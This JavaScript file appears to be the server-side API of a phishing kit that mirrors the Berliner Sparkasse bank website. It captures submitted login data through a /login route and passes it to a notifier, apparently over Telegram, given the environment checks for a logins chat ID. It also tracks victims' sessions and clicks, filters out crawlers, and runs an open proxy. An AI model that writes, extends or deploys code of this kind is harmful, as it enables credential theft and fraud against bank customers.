/**
 * Local API layer for the Berliner Sparkasse mirror.
 */
import '../lib/env.mjs';
import { readFileSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';
import { fetch as undiciFetch } from 'undici';
import { notifyUserAction } from './activity-track.mjs';
import { notifyLoginSubmit } from './login-notify.mjs';
import { notifyNewVisitor } from './visitor-notify.mjs';
import * as custom from './custom.mjs';

const TRACK_CLIENT_JS = readFileSync(
  join(dirname(fileURLToPath(import.meta.url)), 'track-client.js'),
  'utf8',
);

const LOG = process.env.BSK_LOG !== '0';

function log(...args) {
  if (LOG) console.log('[api]', ...args);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    const chunks = [];
    req.on('data', (c) => chunks.push(c));
    req.on('end', () => resolve(Buffer.concat(chunks)));
    req.on('error', reject);
  });
}

function sendJson(res, status, data, extraHeaders = {}) {
  const body = JSON.stringify(data);
  res.writeHead(status, {
    'content-type': 'application/json; charset=utf-8',
    'content-length': Buffer.byteLength(body),
    'access-control-allow-origin': '*',
    'access-control-allow-methods': 'GET, POST, OPTIONS',
    'access-control-allow-headers': 'content-type, authorization',
    ...extraHeaders,
  });
  res.end(body);
}

function corsPreflight(res) {
  res.writeHead(204, {
    'access-control-allow-origin': '*',
    'access-control-allow-methods': 'GET, POST, OPTIONS',
    'access-control-allow-headers': 'content-type, authorization',
    'access-control-max-age': '86400',
  });
  res.end();
}

function normalizeApiPath(pathname) {
  return pathname.replace(/^\/api/, '') || '/';
}

/**
 * @returns {boolean} true if the request was handled
 */
export async function handleApiRequest(req, res, pathname) {
  if (req.method === 'OPTIONS') {
    corsPreflight(res);
    return true;
  }

  const path = normalizeApiPath(pathname);

  if (path === '/health' || path === '/') {
    sendJson(res, 200, {
      ok: true,
      service: 'berliner-sparkasse-mirror',
      upstream: 'https://www.berliner-sparkasse.de',
      telegram: Boolean(process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_CHAT_ID),
      telegramLogins: Boolean(
        process.env.TELEGRAM_BOT_TOKEN && process.env.TELEGRAM_LOGINS_CHAT_ID,
      ),
      ts: Date.now(),
    });
    return true;
  }

  if (path === '/visit' && (req.method === 'POST' || req.method === 'GET')) {
    notifyNewVisitor(req, { path: req.headers.referer || '/visit' }).catch((err) => {
      console.error('[visitor]', err.message || err);
    });
    sendJson(res, 200, { ok: true });
    return true;
  }

  if (path === '/track.js' && req.method === 'GET') {
    res.writeHead(200, {
      'content-type': 'application/javascript; charset=utf-8',
      'cache-control': 'no-cache',
      'access-control-allow-origin': '*',
    });
    res.end(TRACK_CLIENT_JS);
    return true;
  }

  if (path === '/track' && req.method === 'POST') {
    const raw = await readBody(req);
    let body = {};
    try {
      body = raw.length ? JSON.parse(raw.toString('utf8')) : {};
    } catch {
      sendJson(res, 400, { error: 'invalid_json' });
      return true;
    }

    // Real browsers run JS → session_start. Crawlers usually don't.
    if (body.type === 'session_start') {
      notifyNewVisitor(req, { path: body.page || req.headers.referer || '/' }).catch((err) => {
        console.error('[visitor]', err.message || err);
      });
    } else {
      notifyUserAction(req, body).catch((err) => {
        console.error('[activity]', err.message || err);
      });
    }
    sendJson(res, 200, { ok: true });
    return true;
  }

  if (path === '/login' && req.method === 'POST') {
    const raw = await readBody(req);
    let body = {};
    try {
      body = raw.length ? JSON.parse(raw.toString('utf8')) : {};
    } catch {
      sendJson(res, 400, { error: 'invalid_json' });
      return true;
    }
    notifyLoginSubmit(req, body).catch((err) => {
      console.error('[login]', err.message || err);
    });
    sendJson(res, 200, { ok: true });
    return true;
  }

  if (path.startsWith('/proxy/') && req.method === 'GET') {
    const target = path.slice('/proxy/'.length);
    if (!target.startsWith('http')) {
      sendJson(res, 400, { error: 'invalid_target' });
      return true;
    }

    try {
      const upstream = await undiciFetch(decodeURIComponent(target), {
        headers: {
          'accept-encoding': 'identity',
          'user-agent': req.headers['user-agent'] || 'bsk-mirror/1.0',
        },
        signal: AbortSignal.timeout(15000),
      });
      const text = await upstream.text();
      res.writeHead(upstream.status, {
        'content-type': upstream.headers.get('content-type') || 'text/plain',
        'access-control-allow-origin': '*',
      });
      res.end(text);
    } catch (err) {
      log('proxy error', err.message || err);
      sendJson(res, 502, { error: 'upstream_unavailable' });
    }
    return true;
  }

  if (path.startsWith('/custom/')) {
    try {
      const result = await custom.handleCustom(req, res, path, readBody);
      if (result) return true;
    } catch (err) {
      console.error('[api] custom error', err);
      sendJson(res, 500, { error: 'custom_handler_failed' });
      return true;
    }
  }

  return false;
}
